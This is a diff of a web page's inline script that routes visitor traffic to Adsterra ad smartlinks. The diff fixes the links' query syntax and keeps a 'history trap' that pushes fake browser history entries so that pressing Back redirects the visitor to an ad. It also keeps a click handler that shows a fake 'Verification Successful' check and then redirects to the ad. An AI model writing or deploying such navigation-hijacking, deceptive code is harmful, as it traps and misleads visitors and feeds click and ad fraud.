@@ -155,25 +155,22 @@
     </div>
 
     <!-- Arbitrage Core Traffic Logic Engine -->
+   <!-- Arbitrage Core Traffic Logic Engine -->
     <script>
         // ============================================================
-        // CONFIGURATION: Replace with your actual Adsterra Smartlinks
+        // CONFIGURATION: Fixed Tracking Parameter Syntax (& instead of ?)
         // ============================================================
-        // Set up separate tracking extensions to isolate your traffic data blocks
-        const ADSTERRA_MAIN_CTA = "https://mittengulped.com/zbaqp4kht1?key=c0b3695107a19260d31e0b2a8d4096e5?utm_source=us_skim&utm_medium=cta";
-        const ADSTERRA_BACK_1   = "https://mittengulped.com/zbaqp4kht1?key=c0b3695107a19260d31e0b2a8d4096e5?utm_source=us_skim&utm_medium=back1";
-        const ADSTERRA_BACK_2   = "https://mittengulped.com/zbaqp4kht1?key=c0b3695107a19260d31e0b2a8d4096e5?utm_source=us_skim&utm_medium=back2";
+        const ADSTERRA_MAIN_CTA = "https://mittengulped.com/zbaqp4kht1?key=c0b3695107a19260d31e0b2a8d4096e5&utm_source=us_skim&utm_medium=cta";
+        const ADSTERRA_BACK_1   = "https://mittengulped.com/zbaqp4kht1?key=c0b3695107a19260d31e0b2a8d4096e5&utm_source=us_skim&utm_medium=back1";
+        const ADSTERRA_BACK_2   = "https://mittengulped.com/zbaqp4kht1?key=c0b3695107a19260d31e0b2a8d4096e5&utm_source=us_skim&utm_medium=back2";
 
         // ============================================================
         // DOUBLE-JEOPARDY HISTORY TRAP (Automated Back-Button Monetization)
         // ============================================================
-        // Pre-arm the browser history line layers without requiring any interaction
         window.history.pushState({ layer: 2 }, "", ADSTERRA_BACK_2);
         window.history.pushState({ layer: 1 }, "", window.location.href);
 
-        // Capture the hardware back button tap instantly
         window.onpopstate = function (event) {
-            // Slam them into the first back routing link immediately
             window.location.replace(ADSTERRA_BACK_1);
         };
 
@@ -184,13 +181,12 @@
         const boxStatus = document.getElementById('boxStatus');
         const mainHeading = document.getElementById('mainHeading');
         const subHeading = document.getElementById('subHeading');
-        const loaderGraphic = document.getElementById('loaderGraphic');
 
         if (clickZone) {
             clickZone.addEventListener('click', function(e) {
                 e.preventDefault();
 
-                // Visual confirmation trick to maximize immersion before jumping
+                // Visual confirmation trick
                 boxStatus.style.background = "#2563eb";
                 boxStatus.style.borderColor = "#2563eb";
                 boxStatus.innerHTML = '<svg style="width:16px;height:16px;color:white;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>';
@@ -198,7 +194,7 @@
                 mainHeading.innerText = "Verification Successful";
                 subHeading.innerText = "Redirecting securely to content allocation servers...";
                 
-                // Slight timeout execution to give the device thread space to cleanly resolve tracking parameters
+                // Execute redirection with clean URL syntax
                 setTimeout(function() {
                     window.location.href = ADSTERRA_MAIN_CTA;
                 }, 350);
